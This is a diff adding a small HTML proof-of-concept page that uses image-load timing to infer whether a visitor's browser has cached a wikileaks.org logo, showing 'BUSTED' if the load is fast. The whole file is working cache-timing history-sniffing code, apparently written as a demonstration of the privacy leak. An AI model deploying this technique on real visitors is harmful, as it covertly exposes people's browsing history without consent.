@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <title>Cache Timing Attack</title>
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    </head>
+    <body>
+        <h1>Pay no attention to the man behind the curtain</h1>
+        <div id="result"></div>
+
+        <script>
+            var img = new Image();
+            var start = new Date();
+
+            img.onload = function() {
+                var end = new Date();
+                var diff = end.getTime() - start.getTime();
+                var text = 'Load took ' + diff + ' ms ';
+                if (diff < 200) {
+                    $('#result').html(text + '<strong style="color: red;">(BUSTED)</strong>');
+                } else {
+                    $('#result').html(text + '<strong style="color: green;">(OK)</strong>');
+                }
+            };
+
+            img.src = 'https://wikileaks.org/static/gfx/wlogo-sm.png';
+        </script>
+    </body>
+</html>
